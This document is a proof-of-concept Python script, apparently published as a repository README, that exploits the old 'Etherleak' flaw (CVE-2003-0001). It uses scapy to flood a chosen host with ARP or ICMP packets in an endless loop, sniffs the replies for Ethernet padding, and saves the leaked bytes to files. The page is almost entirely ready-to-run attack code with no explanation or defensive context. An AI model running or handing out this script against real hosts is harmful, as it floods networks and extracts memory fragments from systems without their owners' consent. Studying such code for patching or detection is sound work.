# etherleak-python3-poc


```
import os
import sys
import signal
import binascii
from scapy.all import *

def signalhandler(signal, id):
    print("!Killing")
    sys.exit(0)

def spawn(host, attack_type):
    if attack_type == 'arp':
        send(ARP(pdst=host), loop=1, nofilter=1)
    elif attack_type == 'icmp':
        send(IP(dst=host)/ICMP(type=8)/'x', loop=1, nofilter=1)

if __name__ == "__main__":
    print("[ CVE-2003-0001 'Etherleak' exploit")
    signal.signal(signal.SIGINT, signalhandler)
    
    if len(sys.argv) < 4:
        print("[ No! Use with <host> <arp|icmp> <file>")
        sys.exit(1)

    attack_type = sys.argv[2]

    if attack_type not in ['arp', 'icmp']:
        print("Bad type!")
        sys.exit(0)

    pid = os.fork()

    if pid:
        print("[ Attacking %s for %s padding saved to %s.hex" % (sys.argv[1], attack_type, sys.argv[3]))
        spawn(sys.argv[1], attack_type)

    while True:
        if attack_type == 'arp':
            myfilter = "host %s and arp" % sys.argv[1]
        elif attack_type == 'icmp':
            myfilter = "host %s and icmp" % sys.argv[1]
        
        x = sniff(count=1, filter=myfilter, lfilter=lambda x: x.haslayer(Padding))
        p = x[0]

        if attack_type == 'arp':
            pad = p.getlayer(2)
        elif attack_type == 'icmp':
            pad = p.getlayer(4)

        leak = str(pad)
        hexfull = binascii.b2a_hex(leak.encode()).decode()
        file = "%s.hex" % sys.argv[3]

        fdesc = open(file, "a")
        fdesc.write(hexfull + "\n")
        fdesc.close()

        # 32 bits leaked here for me.
        if attack_type == 'icmp':
            bytes_leaked = leak[9:13]
        elif attack_type == 'arp':
            bytes_leaked = leak[10:14]

        fdesc = open(sys.argv[3], "ab")
        fdesc.write(bytes_leaked.encode())
        fdesc.close()
```
